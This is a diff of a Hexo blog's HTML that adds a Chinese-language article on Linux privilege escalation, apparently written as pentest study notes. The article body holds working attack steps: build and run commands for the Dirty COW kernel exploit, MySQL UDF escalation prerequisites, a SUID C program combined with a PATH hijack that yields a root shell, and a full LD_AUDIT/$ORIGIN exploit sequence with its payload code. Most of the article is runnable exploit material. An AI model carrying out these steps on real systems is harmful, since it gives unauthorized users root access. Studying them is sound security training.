@@ -18,17 +18,17 @@
   <link 
     rel="icon" 
     href="/img/favicon.png">
-  <title>标签</title>
+  <title>Linux提权</title>
   
     
       <meta 
         property="og:title" 
-        content="标签">
+        content="Linux提权">
     
     
       <meta 
         property="og:url" 
-        content="https://www.zerochen.top/tags/Access/index.html">
+        content="https://www.zerochen.top/article/Linux%E6%8F%90%E6%9D%83/index.html">
     
     
       <meta 
@@ -36,6 +36,26 @@
         content="/img/logo.png">
     
     
+    
+      <meta 
+        property="og:type" 
+        content="article">
+      <meta 
+        property="og:article:published_time" 
+        content="2021-08-28">
+      <meta 
+        property="og:article:modified_time" 
+        content="2021-08-28">
+      <meta 
+        property="og:article:author" 
+        content="沉墨">
+      
+        
+          <meta 
+            property="og:article:tag" 
+            content="提权">
+        
+      
     
   
   <script>
@@ -143,6 +163,8 @@
   
   <link rel="stylesheet" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css">
   
+    <link rel="stylesheet" href="/js/lib/lightbox/baguetteBox.min.css">
+  
   
 <meta name="generator" content="Hexo 5.4.0"></head>
 
@@ -241,31 +263,266 @@
         <div class="container">
           <div class="columns">
             <main class="main-column">
-<div class="card card-content tag-page-card">
-  <div class="tags-page-title">标签&nbsp-&nbspAccess</div>
-</div>
-<div class="archive-timeline">
-  
-  
+<article class="card card-content">
+  <header>
+    <h1 class="post-title">
+      Linux提权
+    </h1>
+  </header>
+  <div class="post-meta post-show-meta">
+    <time datetime="2021-08-28T12:28:05.000Z">
+      <i 
+        class="iconfont icon-calendar" 
+        style="margin-right: 2px;">
+      </i>
+      <span>2021-08-28</span>
+    </time>
     
-      <div class="archive-timeline-tag"><span>2021</span></div>
+      <span class="dot"></span>
+      
+        <a 
+          href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" 
+          class="post-meta-link">
+          内网渗透
+        </a>
       
     
-    <div class="archive-timeline-item">
-      <div class="archive-timeline-post">
-        <div class="card card-content">
-          <div class="archive-timeline-post-date">2021-08-05</div>
-          <div class="archive-timeline-post-content">
-            <a 
-              href="/article/Access%E6%B3%A8%E5%85%A5/" 
-              class="archive-timeline-post-item">
-              Access注入
-            </a>
-          </div>
-        </div>
+    
+      <span class="dot"></span>
+      <span>768 字</span>
+    
+  </div>
+  
+    <div 
+      class="post-meta post-show-meta" 
+      style="margin-top: -10px;">
+      <div style="display: flex; align-items: center;">
+        <i 
+          class="iconfont icon-biaoqian" 
+          style="margin-right: 2px; font-size: 1.15rem;">
+        </i>
+        
+          
+          <a 
+            href="/tags/%E6%8F%90%E6%9D%83/" 
+            class="post-meta-link">
+            提权
+          </a>
+        
       </div>
     </div>
   
+  </header>
+  <div 
+    id="section" 
+    class="post-content">
+    <p>基础漏洞提权、数据库提权、SUID提权</p>
+<p>常用命令</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>uname  -a</td>
+<td>显示所有可用系统信息</td>
+</tr>
+<tr>
+<td>uname  -r</td>
+<td>内核版本</td>
+</tr>
+<tr>
+<td>uname  -m</td>
+<td>查看系统架构（32/64）</td>
+</tr>
+<tr>
+<td>cat  /proc/version</td>
+<td>内核信息</td>
+</tr>
+<tr>
+<td>cat  /etc/issue</td>
+<td>发行版本信息</td>
+</tr>
+<tr>
+<td>id</td>
+<td>当前用户信息</td>
+</tr>
+</tbody></table>
+<p><a target="_blank" rel="noopener" href="https://github.com/SecWiki/Linux-kernel-exploits">https://github.com/SecWiki/Linux-kernel-exploits</a></p>
+<p>脏牛提权：</p>
+<p>漏洞范围：</p>
+<p>Linux kernel &gt;= 2.6.22（2007年发行，到2016年10月18日才修复）</p>
+<p>（CVE-2016-5195 Dirty cow -&gt; centos6、Ubuntu14、16）</p>
+<p>C版本</p>
+<p>Ubuntu系统会导致系统重启</p>
+<p>若是直接执行导致服务器无响应，需要进入/tmp下修改passwd.bak文件后缀，则可重新运行</p>
+<p>实战中，需要将原始备份文件（/tmp/passwd.bak）移动至/etc/passwd，其余的备份文件可删除</p>
+<p>编译</p>
+<pre class="highlight"><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br></pre>
+
+<p>运行</p>
+<pre class="highlight"><span class="line">./dirty _passwd</span><br></pre>
+
+<p>C++版本（解决Ubuntu系统崩溃问题）</p>
+<pre class="highlight"><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</span><br><span class="line"></span><br><span class="line">./dcow -s</span><br></pre>
+
+<p>可复刻虚拟机，然后在本地虚拟机编译g++之后再上传靶机</p>
+<p>用法</p>
+<table>
+<thead>
+<tr>
+<th>语句</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>gcc  exp.c -o exp</td>
+<td>gcc编译</td>
+</tr>
+<tr>
+<td>./exp</td>
+<td>运行</td>
+</tr>
+</tbody></table>
+<p>注：需要在交互式终端运行</p>
+<p>其他常用脚本：</p>
+<p>CVE-2018-1000001(glibc)</p>
+<p>Mysql的UDF提权</p>
+<p>前提：</p>
+<p>mysql的root账户</p>
+<p>mysqld以操作系统的root权限启动</p>
+<p>secure_file_priv=’’</p>
+<p>提权过程</p>
+<p>同Windows的Mysql的UDF提权</p>
+<p>详见udf.txt</p>
+<p>导出路径固定/usr/lib64/mysql/plugin/x.so</p>
+<p>SUID提权</p>
+<p>作用于二进制可执行程序上，当执行这个程序时会临时切换身份为文件所有者身份</p>
+<p>设置方法</p>
+<p>权限设定方法：</p>
+<p>1、 字母表示法：</p>
+<p>chmod u+s FILE … à 添加SUID权限</p>
+<p>chmod u-s FILE … à 删除SUID权限</p>
+<p>2、数字表示法：</p>
+<p>chmod 4755 FILE à 添加SUID权限到二进制程序文件 ** 在普通三位数字权限之前，用4代表添加到SUID位</p>
+<p>chmod 0xxx FILE à 可以删除文件的SUID</p>
+<p>注：s表示有效的suid权限，S表示没有执行权限，suid权限无效</p>
+<p>提权步骤</p>
+<p>1、编写C文件</p>
+<pre class="highlight"><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">setuid(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">setgid(<span class="number">0</span>); # 两句设置以root权限运行</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;su root&quot;</span>); # 切换到root用户</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre>
+
+<p>2、编译</p>
+<p>gcc demo.c -o demo</p>
+<p>3、添加suid权限</p>
+<p>chmod +s demo</p>
+<p>4、伪装su文件。因为 demo.c 中有“su root”这个系统命令，要让这个su命令执行的不是系统自带的su脚本</p>
+<pre class="highlight"><span class="line">echo &quot;/bin/bash&quot; &gt; su</span><br><span class="line"></span><br><span class="line">chmod 777 su</span><br></pre>
+
+
+
+<p>5、添加环境变量，让系统执行/tmp下的su文件</p>
+<pre class="highlight"><span class="line">export PATH=/tmp:$PATH</span><br></pre>
+
+<p>6、在普通用户下运行demo程序，切换到root账户，提权成功</p>
+<p>其他提权方式</p>
+<p>亲测可用（环境centos7）</p>
+<pre class="highlight"><span class="line">登录普通用户</span><br><span class="line"></span><br><span class="line">mkdir /tmp/exploit                //创建目录</span><br><span class="line"></span><br><span class="line">ln -s /bin/ping /tmp/exploit/target        //创建ping链接</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> 3&lt; /tmp/exploit/target            //设置文件夹描述为3</span><br><span class="line"></span><br><span class="line">rm -rf /tmp/exploit/            //删除文件夹</span><br><span class="line"></span><br><span class="line">ls -l /proc/$$/fd/3                //复制$$值</span><br><span class="line"></span><br><span class="line">vim payload.c                //创建配置文件</span><br><span class="line"></span><br><span class="line">void __attribute__((constructor)) init()           //在配置文件加入如下的内容</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">setuid(0);</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">:wq</span><br><span class="line"></span><br><span class="line">gcc -w -fPIC -shared -o /tmp/exploit payload.c    //需要安装gcc</span><br><span class="line"></span><br><span class="line">ls -l /tmp/exploit</span><br><span class="line"></span><br><span class="line">LD_AUDIT=<span class="string">&quot;<span class="variable">$ORIGIN</span>&quot;</span> <span class="built_in">exec</span> /proc/复制$$值/fd/3</span><br></pre>
+
+
+  </div>
+  <div>
+    
+      <div 
+        class="post-note note-warning copyright" 
+        style="margin-top: 42px">
+        <p>
+          <span style="font-weight: bold;">作者：</span><a 
+            target="_blank" 
+            rel="nofollow noopener noreferrer" 
+            href="/about">
+            沉墨
+          </a>
+        </p>
+        <p>
+          <span style="font-weight: bold;">文章链接：</span><a 
+            target="_blank" 
+            rel="nofollow noopener noreferrer" 
+            href="https://www.zerochen.top/article/Linux%E6%8F%90%E6%9D%83/">
+            https://www.zerochen.top/article/Linux%E6%8F%90%E6%9D%83/
+          </a>
+        </p>
+        <p><span style="font-weight: bold;">版权声明：</span>转载请注明出处！</p>
+      </div>
+    
+  </div>
+</article>
+<div class="nav">
+  
+  
+    <div class="nav-item-next">
+      <a 
+        href="/article/Windows%E6%8F%90%E6%9D%83/" 
+        class="nav-link">
+        <div>
+          <div class="nav-label">下一篇</div>
+          
+            <div class="nav-title">Windows提权 </div>
+          
+        </div>
+        <i class="iconfont icon-right nav-next-icon"></i>
+      </a>
+    </div>
+  
+</div>
+
+  <div 
+    class="card card-content comment-card" 
+    style="margin-top: 16px;">
+    <div class="comment-card-title">评论</div>
+    
+  <div id="vcomments"></div>
+  
+  <script>
+    loadScript("//unpkg.com/valine/dist/Valine.min.js");
+    var oldLoadVa = window.onload;
+    window.onload = function () {
+      oldLoadVa && oldLoadVa();
+      new Valine({
+        el: '#vcomments',
+        appId: '2ShT4MB47jbSbE00Kn5TgK8j-gzGzoHsz',
+        appKey: 'eC6yijqvttNWfHdJogIgmhA4',
+        placeholder: 'Just go go',
+        path: window.location.pathname,
+        avatar: 'mp',
+        meta: ["nick","mail","link"],
+        pageSize: '10',
+        lang: '',
+        visitor: 'false',
+        highlight: true,
+        recordIP: false,
+        
+        
+        
+        enableQQ: 'false',
+        requiredFields: [],
+      });
+    };
+  </script>
+
+  </div>
+
+<div 
+  class="card card-content toc-card" 
+  id="mobiletoc">
+  <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
+
 </div></main>
             <aside class="left-column">
               
@@ -302,6 +559,18 @@
               </div>
                <div class="sticky-tablet">
   
+  
+    <article class="display-when-two-columns spacer">
+      <div class="card card-content toc-card">
+        <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
+
+      </div>
+    </article>
   
   
   <article class="card card-content categories-widget">
@@ -506,229 +775,21 @@
   </article>
   
   
-    <article class="card card-content widescreen-archive archive-widget">
-      <div class="archive-card">
-  <div class="archive-card-header">
-    <i 
-      class="iconfont icon-wodebaobiao" 
-      style="padding-right: 2px;">
-    </i>归档
-  </div>
-  <div class="archive-card-list">
-    
-    
-    
-      
-        
-        
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-    
-      <a 
-        href="/archives/2021" 
-        class="archive-card-list-item">
-        2021
-        <span class="archive-card-list-item-badge">48</span>
-      </a>
-    
-  </div>
-</div>
-    </article>
-  
 </div>
             </aside>
             <aside class="right-column">
               <div class="sticky-widescreen">
   
+  
+    <article class="card card-content toc-card">
+      <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
+
+    </article>
   
   
   <article class="card card-content">
@@ -765,224 +826,6 @@
 </div>
   </article>
   
-  
-    <article class="card card-content">
-      <div class="archive-card">
-  <div class="archive-card-header">
-    <i 
-      class="iconfont icon-wodebaobiao" 
-      style="padding-right: 2px;">
-    </i>归档
-  </div>
-  <div class="archive-card-list">
-    
-    
-    
-      
-        
-        
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-      
-        
-      
-    
-    
-      <a 
-        href="/archives/2021" 
-        class="archive-card-list-item">
-        2021
-        <span class="archive-card-list-item-badge">48</span>
-      </a>
-    
-  </div>
-</div>
-    </article>
   
 </div>
             </aside>
@@ -1079,6 +922,36 @@
 </a> 
      
      
+     
+      <script>
+  var addImgLayout = function () {
+    var img = document.querySelectorAll('.post-content img')
+    var i
+    for (i = 0; i < img.length; i++) {
+      var wrapper = document.createElement('a')
+      wrapper.setAttribute('href', img[i].getAttribute('data-src'))
+      wrapper.setAttribute('aria-label', 'illustration')
+      wrapper.style.cssText =
+        'width: 100%; display: flex; justify-content: center;'
+      if (img[i].alt) wrapper.dataset.caption = img[i].alt
+      wrapper.dataset.nolink = true
+      img[i].before(wrapper)
+      wrapper.append(img[i])
+      var divWrap = document.createElement('div')
+      divWrap.classList.add('gallery')
+      wrapper.before(divWrap)
+      divWrap.append(wrapper)
+    }
+    baguetteBox.run('.gallery')
+  }
+</script>
+<script>
+  loadScript(
+    "/js/lib/lightbox/baguetteBox.min.js",
+    addImgLayout
+  )
+</script>
+ 
      
      
     <script src="/js/main.js"></script> 
